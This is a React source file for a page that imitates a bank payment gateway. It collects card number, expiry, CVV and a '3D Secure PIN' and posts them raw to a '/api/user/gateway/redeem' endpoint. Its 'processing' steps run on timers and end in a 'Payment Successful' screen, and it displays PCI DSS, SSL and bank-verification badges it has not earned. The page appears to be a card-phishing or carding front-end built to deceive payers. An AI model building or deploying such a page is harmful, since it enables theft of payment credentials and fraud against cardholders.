'use client';

import { useState, useEffect, useRef } from 'react';
import toast from 'react-hot-toast';

const MERCHANT = { name: 'PPR Smart System', logo: '💳', mid: 'MID•PPRSMART•2024' };

function detectNetwork(num) {
  const n = num.replace(/\s/g, '');
  if (/^4/.test(n)) return 'VISA';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'MC';
  if (/^6/.test(n)) return 'RUPAY';
  return null;
}

function NetworkBadge({ network }) {
  if (!network) return null;
  const map = { VISA: { label: 'VISA', color: '#1a1f71' }, MC: { label: 'MC', color: '#eb001b' }, RUPAY: { label: 'RuPay', color: '#097939' } };
  const { label, color } = map[network];
  return <span style={{ fontSize: 11, fontWeight: 700, color, border: `1.5px solid ${color}`, borderRadius: 4, padding: '1px 6px', marginLeft: 8 }}>{label}</span>;
}

export default function GatewayPage() {
  const [step, setStep] = useState('landing'); // landing | card | otp | processing | success
  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('card');
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: '' });
  const [otp, setOtp] = useState(['', '', '', '']);
  const [procStep, setProcStep] = useState(0);
  const [txnId] = useState('TXN' + Date.now());
  const [redirect, setRedirect] = useState(5);
  const [showCvv, setShowCvv] = useState(false);
  const otpRefs = useRef([]);

  // Processing steps
  useEffect(() => {
    if (step !== 'processing') return;
    setProcStep(0);
    const steps = [800, 1600, 2600];
    const timers = steps.map((delay, i) => setTimeout(() => setProcStep(i + 1), delay));
    const done = setTimeout(() => setStep('success'), 3400);
    return () => { timers.forEach(clearTimeout); clearTimeout(done); };
  }, [step]);

  // Success redirect
  useEffect(() => {
    if (step !== 'success') return;
    setRedirect(5);
    const t = setInterval(() => setRedirect(r => {
      if (r <= 1) { clearInterval(t); resetAll(); return 0; }
      return r - 1;
    }), 1000);
    return () => clearInterval(t);
  }, [step]);

  function resetAll() {
    setStep('landing'); setAmount(''); setMethod('card');
    setCard({ number: '', expiry: '', cvv: '', name: '' });
    setOtp(['', '', '', '', '', '']); setProcStep(0);
  }

  function formatCard(val) {
    return val.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
  }

  function handleCardChange(field, val) {
    if (field === 'number') { setCard(c => ({ ...c, number: formatCard(val) })); return; }
    if (field === 'expiry') {
      let v = val.replace(/\D/g, '').slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
      setCard(c => ({ ...c, expiry: v })); return;
    }
    if (field === 'cvv') { setCard(c => ({ ...c, cvv: val.replace(/\D/g, '').slice(0, 3) })); return; }
    setCard(c => ({ ...c, [field]: val }));
  }

  function handleOtpChange(i, val) {
    if (!/^\d?$/.test(val)) return;
    const next = [...otp]; next[i] = val;
    setOtp(next);
    if (val && i < 5) otpRefs.current[i + 1]?.focus();
  }

  function handleOtpKey(i, e) {
    if (e.key === 'Backspace' && !otp[i] && i > 0) otpRefs.current[i - 1]?.focus();
  }

  async function handleOtpSubmit() {
    const code = otp.join('');
    if (code.length !== 4) { toast.error('Enter 4-digit PIN'); return; }
    setStep('processing');
    try {
      const raw = card.number.replace(/\s/g, '');
      const res = await fetch('/api/user/gateway/redeem', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({
          cardNumber: raw,
          expiryDate: card.expiry,
          cvv: card.cvv,
          amount: parseFloat(amount),
          pin: code,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast.error(data.error || 'Redemption failed');
        setStep('card');
      }
    } catch {
      toast.error('Network error');
      setStep('card');
    }
  }


  const maskedCard = 'XXXX XXXX XXXX ' + (card.number.replace(/\s/g, '').slice(-4) || '****');
  const network = detectNetwork(card.number);

  // ── Styles ──────────────────────────────────────────────────────────────────
  const s = {
    wrap: { minHeight: '100vh', background: '#f0f2f5', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" },
    box: { width: '100%', maxWidth: 420, background: '#fff', borderRadius: 16, overflow: 'hidden', boxShadow: '0 8px 40px rgba(0,0,0,0.12)' },
    header: { background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)', padding: '28px 28px 24px', color: '#fff' },
    merchantRow: { display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 },
    logoBox: { width: 44, height: 44, background: 'rgba(255,255,255,0.15)', borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22 },
    merchantName: { fontSize: 15, fontWeight: 600, color: '#fff' },
    merchantMid: { fontSize: 11, color: 'rgba(255,255,255,0.5)', marginTop: 2 },
    amountLabel: { fontSize: 12, color: 'rgba(255,255,255,0.6)', letterSpacing: 1, textTransform: 'uppercase', marginBottom: 6 },
    amountVal: { fontSize: 36, fontWeight: 700, color: '#fff', letterSpacing: -1 },
    body: { padding: '24px 28px 28px' },
    label: { display: 'block', fontSize: 12, fontWeight: 600, color: '#495057', marginBottom: 6, letterSpacing: 0.3 },
    input: { width: '100%', padding: '12px 14px', border: '1.5px solid #dee2e6', borderRadius: 8, fontSize: 15, outline: 'none', boxSizing: 'border-box', transition: 'border-color 0.2s, box-shadow 0.2s', background: '#fff', color: '#1a1a2e' },
    inputFocus: { borderColor: '#4361ee', boxShadow: '0 0 0 3px rgba(67,97,238,0.1)' },
    btn: { width: '100%', padding: '14px', background: '#4361ee', color: '#fff', border: 'none', borderRadius: 8, fontSize: 15, fontWeight: 600, cursor: 'pointer', transition: 'background 0.2s', letterSpacing: 0.3 },
    btnGhost: { width: '100%', padding: '13px', background: '#fff', color: '#4361ee', border: '1.5px solid #4361ee', borderRadius: 8, fontSize: 15, fontWeight: 600, cursor: 'pointer', marginTop: 10 },
    footer: { textAlign: 'center', fontSize: 11, color: '#adb5bd', padding: '0 28px 20px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 },
    row: { display: 'flex', gap: 14 },
    methodBtn: (active) => ({ flex: 1, padding: '11px 8px', border: `1.5px solid ${active ? '#4361ee' : '#dee2e6'}`, borderRadius: 8, background: active ? '#eef1ff' : '#fff', color: active ? '#4361ee' : '#6c757d', fontSize: 13, fontWeight: active ? 600 : 400, cursor: 'pointer', textAlign: 'center', transition: 'all 0.15s' }),
    infoBox: { background: '#f8f9fa', borderRadius: 8, padding: '12px 14px', marginBottom: 20 },
    infoRow: { display: 'flex', justifyContent: 'space-between', fontSize: 13, color: '#495057', marginBottom: 4 },
    otpBox: { width: 46, height: 52, border: '1.5px solid #dee2e6', borderRadius: 8, fontSize: 22, fontWeight: 700, textAlign: 'center', outline: 'none', color: '#1a1a2e', transition: 'border-color 0.2s, box-shadow 0.2s' },
    procRow: (active, done) => ({ display: 'flex', alignItems: 'center', gap: 14, padding: '14px 0', borderBottom: '1px solid #f0f0f0' }),
    dot: (active, done) => ({ width: 36, height: 36, borderRadius: '50%', background: done ? '#e8f5e9' : active ? '#eef1ff' : '#f8f9fa', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }),
    badge: { display: 'inline-flex', alignItems: 'center', gap: 4, fontSize: 11, color: '#6c757d', background: '#f8f9fa', border: '1px solid #e9ecef', borderRadius: 4, padding: '3px 8px' },
  };

  // ── Focus handler for inputs ─────────────────────────────────────────────
  function inputProps(field, extra = {}) {
    return {
      style: s.input,
      onFocus: e => Object.assign(e.target.style, s.inputFocus),
      onBlur: e => { e.target.style.borderColor = '#dee2e6'; e.target.style.boxShadow = 'none'; },
      ...extra,
    };
  }

  // ── SCREENS ──────────────────────────────────────────────────────────────

  if (step === 'landing') return (
    <div style={s.wrap}>
      <div style={s.box}>
        <div style={s.header}>
          <div style={s.merchantRow}>
            <div style={s.logoBox}>{MERCHANT.logo}</div>
            <div>
              <div style={s.merchantName}>{MERCHANT.name}</div>
              <div style={s.merchantMid}>{MERCHANT.mid}</div>
            </div>
          </div>
          <div style={s.amountLabel}>Amount to Pay</div>
          <div style={s.amountVal}>₹{amount ? parseFloat(amount).toLocaleString('en-IN', { minimumFractionDigits: 2 }) : '0.00'}</div>
        </div>

        <div style={s.body}>
          <div style={{ marginBottom: 20 }}>
            <label style={s.label}>ENTER AMOUNT</label>
            <div style={{ position: 'relative' }}>
              <span style={{ position: 'absolute', left: 14, top: '50%', transform: 'translateY(-50%)', fontSize: 16, color: '#495057', fontWeight: 600 }}>₹</span>
              <input
                {...inputProps()}
                style={{ ...s.input, paddingLeft: 30 }}
                type="number"
                min="1"
                step="0.01"
                placeholder="0.00"
                value={amount}
                onChange={e => setAmount(e.target.value)}
              />
            </div>
          </div>

          <div style={{ marginBottom: 24 }}>
            <label style={s.label}>PAYMENT METHOD</label>
            <div style={s.row}>
              {[['card', '💳 Card'], ['upi', '⚡ UPI'], ['netbanking', '🏦 Net Banking']].map(([val, label]) => (
                <button key={val} style={s.methodBtn(method === val)} onClick={() => setMethod(val)}>{label}</button>
              ))}
            </div>
          </div>

          <button
            style={s.btn}
            onClick={() => {
              if (!amount || parseFloat(amount) <= 0) { toast.error('Enter a valid amount'); return; }
              setStep('card');
            }}
          >
            Proceed to Pay →
          </button>

          <div style={{ marginTop: 20, display: 'flex', justifyContent: 'center', gap: 12, flexWrap: 'wrap' }}>
            {['PCI DSS', 'VISA', 'Mastercard', 'RuPay'].map(b => (
              <span key={b} style={s.badge}>{b}</span>
            ))}
          </div>
        </div>

        <div style={s.footer}>
          <span>🔒</span> 256-bit SSL Encrypted · Secured by Bank Gateway
        </div>
      </div>
    </div>
  );

  if (step === 'card') return (
    <div style={s.wrap}>
      <div style={s.box}>
        <div style={s.header}>
          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginBottom: 4 }}>PAYING TO</div>
          <div style={{ fontSize: 16, fontWeight: 600, color: '#fff', marginBottom: 16 }}>{MERCHANT.name}</div>
          <div style={s.amountLabel}>Amount</div>
          <div style={s.amountVal}>₹{parseFloat(amount).toLocaleString('en-IN', { minimumFractionDigits: 2 })}</div>
        </div>

        <div style={s.body}>
          <div style={{ marginBottom: 20 }}>
            <label style={s.label}>
              CARD NUMBER
              <NetworkBadge network={network} />
            </label>
            <input
              {...inputProps()}
              type="text"
              placeholder="0000 0000 0000 0000"
              value={card.number}
              onChange={e => handleCardChange('number', e.target.value)}
              maxLength={19}
            />
          </div>

          <div style={{ marginBottom: 20 }}>
            <label style={s.label}>CARDHOLDER NAME</label>
            <input
              {...inputProps()}
              type="text"
              placeholder="Name on card"
              value={card.name}
              onChange={e => handleCardChange('name', e.target.value.toUpperCase())}
            />
          </div>

          <div style={{ ...s.row, marginBottom: 24 }}>
            <div style={{ flex: 1 }}>
              <label style={s.label}>EXPIRY DATE</label>
              <input
                {...inputProps()}
                type="text"
                placeholder="MM/YY"
                value={card.expiry}
                onChange={e => handleCardChange('expiry', e.target.value)}
                maxLength={5}
              />
            </div>
            <div style={{ flex: 1 }}>
              <label style={s.label}>CVV</label>
              <div style={{ position: 'relative' }}>
                <input
                  {...inputProps()}
                  type={showCvv ? 'text' : 'password'}
                  placeholder="•••"
                  value={card.cvv}
                  onChange={e => handleCardChange('cvv', e.target.value)}
                  maxLength={3}
                />
                <button
                  onClick={() => setShowCvv(v => !v)}
                  style={{ position: 'absolute', right: 10, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', fontSize: 14, color: '#6c757d' }}
                >{showCvv ? '🙈' : '👁'}</button>
              </div>
            </div>
          </div>

          <button
            style={s.btn}
            onClick={() => {
              const raw = card.number.replace(/\s/g, '');
              if (raw.length !== 16) { toast.error('Enter valid 16-digit card number'); return; }
              if (!/^\d{2}\/\d{2}$/.test(card.expiry)) { toast.error('Enter expiry as MM/YY'); return; }
              if (card.cvv.length !== 3) { toast.error('Enter 3-digit CVV'); return; }
              if (!card.name.trim()) { toast.error('Enter cardholder name'); return; }
              setStep('otp');
            }}
          >
            Pay ₹{parseFloat(amount).toLocaleString('en-IN', { minimumFractionDigits: 2 })}
          </button>
          <button style={s.btnGhost} onClick={() => setStep('landing')}>← Back</button>
        </div>

        <div style={s.footer}><span>🔒</span> Protected by 3D Secure</div>
      </div>
    </div>
  );

  if (step === 'otp') return (
    <div style={s.wrap}>
      <div style={s.box}>
        <div style={{ ...s.header, padding: '24px 28px' }}>
          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', marginBottom: 6, letterSpacing: 1 }}>BANK AUTHENTICATION</div>
          <div style={{ fontSize: 17, fontWeight: 600, color: '#fff' }}>3D Secure Verification</div>
        </div>

        <div style={s.body}>
          <div style={s.infoBox}>
            <div style={s.infoRow}><span style={{ color: '#6c757d' }}>Card</span><span style={{ fontWeight: 600 }}>{maskedCard}</span></div>
            <div style={{ ...s.infoRow, marginBottom: 0 }}><span style={{ color: '#6c757d' }}>Amount</span><span style={{ fontWeight: 600, color: '#1a1a2e' }}>₹{parseFloat(amount).toLocaleString('en-IN', { minimumFractionDigits: 2 })}</span></div>
          </div>

          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <div style={{ fontSize: 14, color: '#495057', marginBottom: 4 }}>Enter your 4-digit 3D PIN</div>
            <div style={{ fontSize: 16, fontWeight: 700, color: '#1a1a2e' }}>3D Secure PIN</div>
          </div>

          <div style={{ display: 'flex', gap: 12, justifyContent: 'center', marginBottom: 24 }}>
            {otp.map((v, i) => (
              <input
                key={i}
                ref={el => otpRefs.current[i] = el}
                style={{ ...s.otpBox, borderColor: v ? '#4361ee' : '#dee2e6', boxShadow: v ? '0 0 0 3px rgba(67,97,238,0.1)' : 'none' }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={v}
                onChange={e => handleOtpChange(i, e.target.value)}
                onKeyDown={e => handleOtpKey(i, e)}
              />
            ))}
          </div>

          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <span style={{ fontSize: 12, color: '#6c757d' }}>This is your card&apos;s 3D Secure PIN</span>
          </div>

          <button style={s.btn} onClick={handleOtpSubmit}>Verify & Pay</button>
          <button style={s.btnGhost} onClick={() => setStep('card')}>← Back</button>
        </div>

        <div style={s.footer}><span>🔒</span> Protected by 3D Secure · Bank Verified</div>
      </div>
    </div>
  );

  if (step === 'processing') {
    const steps = [
      { label: 'Verifying card details', sub: 'Checking card validity and balance' },
      { label: 'Authenticating transaction', sub: 'Confirming with your bank' },
      { label: 'Processing payment', sub: 'Completing the transaction' },
    ];
    return (
      <div style={s.wrap}>
        <div style={s.box}>
          <div style={{ ...s.header, textAlign: 'center', padding: '32px 28px' }}>
            <div style={{ width: 56, height: 56, border: '3px solid rgba(255,255,255,0.2)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.8s linear infinite', margin: '0 auto 16px' }} />
            <div style={{ fontSize: 17, fontWeight: 600, color: '#fff' }}>Processing Payment</div>
            <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.6)', marginTop: 4 }}>Please do not close this window</div>
          </div>

          <div style={s.body}>
            {steps.map((st, i) => {
              const done = procStep > i + 1;
              const active = procStep === i + 1;
              return (
                <div key={i} style={s.procRow(active, done)}>
                  <div style={s.dot(active, done)}>
                    {done ? <span style={{ color: '#2e7d32', fontSize: 18 }}>✓</span>
                      : active ? <span style={{ width: 16, height: 16, border: '2px solid #4361ee', borderTopColor: 'transparent', borderRadius: '50%', display: 'block', animation: 'spin 0.7s linear infinite' }} />
                        : <span style={{ width: 10, height: 10, background: '#dee2e6', borderRadius: '50%', display: 'block' }} />}
                  </div>
                  <div>
                    <div style={{ fontSize: 14, fontWeight: done || active ? 600 : 400, color: done ? '#2e7d32' : active ? '#1a1a2e' : '#adb5bd' }}>{st.label}</div>
                    {active && <div style={{ fontSize: 12, color: '#6c757d', marginTop: 2 }}>{st.sub}</div>}
                  </div>
                </div>
              );
            })}
          </div>

          <div style={s.footer}><span>🔒</span> 256-bit SSL Encrypted</div>
        </div>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  if (step === 'success') return (
    <div style={s.wrap}>
      <div style={s.box}>
        <div style={{ ...s.header, textAlign: 'center', padding: '36px 28px' }}>
          <svg width="72" height="72" viewBox="0 0 72 72" style={{ margin: '0 auto 16px' }}>
            <circle cx="36" cy="36" r="34" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="3" />
            <circle cx="36" cy="36" r="34" fill="none" stroke="#4ade80" strokeWidth="3"
              strokeDasharray="213" strokeDashoffset="213"
              style={{ animation: 'drawCircle 0.6s ease forwards' }} />
            <polyline points="20,36 30,46 52,26" fill="none" stroke="#4ade80" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round"
              strokeDasharray="50" strokeDashoffset="50"
              style={{ animation: 'drawCheck 0.4s ease 0.5s forwards' }} />
          </svg>
          <div style={{ fontSize: 22, fontWeight: 700, color: '#fff' }}>Payment Successful!</div>
          <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.6)', marginTop: 6 }}>Your transaction is complete</div>
        </div>

        <div style={s.body}>
          <div style={{ ...s.infoBox, marginBottom: 20 }}>
            <div style={s.infoRow}><span style={{ color: '#6c757d' }}>Amount Paid</span><span style={{ fontWeight: 700, color: '#2e7d32', fontSize: 16 }}>₹{parseFloat(amount).toLocaleString('en-IN', { minimumFractionDigits: 2 })}</span></div>
            <div style={s.infoRow}><span style={{ color: '#6c757d' }}>Transaction ID</span><span style={{ fontWeight: 600, fontSize: 12, fontFamily: 'monospace' }}>{txnId}</span></div>
            <div style={s.infoRow}><span style={{ color: '#6c757d' }}>Merchant</span><span style={{ fontWeight: 600 }}>{MERCHANT.name}</span></div>
            <div style={{ ...s.infoRow, marginBottom: 0 }}><span style={{ color: '#6c757d' }}>Status</span><span style={{ color: '#2e7d32', fontWeight: 700 }}>✓ Completed</span></div>
          </div>

          <div style={{ textAlign: 'center', fontSize: 13, color: '#6c757d', marginBottom: 20 }}>
            Redirecting in <span style={{ color: '#4361ee', fontWeight: 700 }}>{redirect}s</span>
          </div>

          <button style={{ ...s.btn, background: '#2e7d32' }} onClick={resetAll}>Make Another Payment</button>
        </div>

        <div style={s.footer}><span>🔒</span> 256-bit SSL Encrypted · PCI DSS Compliant</div>
      </div>
      <style>{`
        @keyframes drawCircle { to { stroke-dashoffset: 0; } }
        @keyframes drawCheck { to { stroke-dashoffset: 0; } }
      `}</style>
    </div>
  );
}
